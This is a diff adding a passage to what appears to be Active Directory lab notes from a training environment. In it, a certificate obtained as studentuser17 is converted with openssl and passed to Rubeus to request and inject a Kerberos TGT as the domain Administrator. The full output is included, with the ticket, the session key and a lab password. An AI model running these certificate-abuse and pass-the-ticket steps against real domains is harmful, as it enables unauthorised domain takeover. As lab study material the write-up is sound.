@@ -403,3 +403,47 @@ iv/4Ra5WLy5XeyEHNHs1CbDCnmXqGKi4ll1Ngw==
 
 Certify completed in 00:00:18.0310140
 ```
+
+Use DA and ingect TGT:
+
+```
+C:\Windows\system32>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\certificate.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\DA.pfx
+WARNING: can't open config file: /usr/local/ssl/openssl.cnf
+Enter Export Password:
+Verifying - Enter Export Password:
+
+C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\DA.pfx /password:SecretPass@123 /nowrap /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=studentuser17, CN=Users, DC=us, DC=techcorp, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'us.techcorp.local\Administrator'
+[*] Using domain controller: 192.168.1.2:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/us.techcorp.local
+  ServiceRealm             :  US.TECHCORP.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  US.TECHCORP.LOCAL
+  StartTime                :  2/22/2023 11:03:30 AM
+  EndTime                  :  2/22/2023 9:03:30 PM
+  RenewTill                :  3/1/2023 11:03:30 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  FtXWhGOiLw3EbHN75T9hWw==
+  ASREP (key)              :  69A3667CEE956F4B563FF10ADEF27060
+
+```
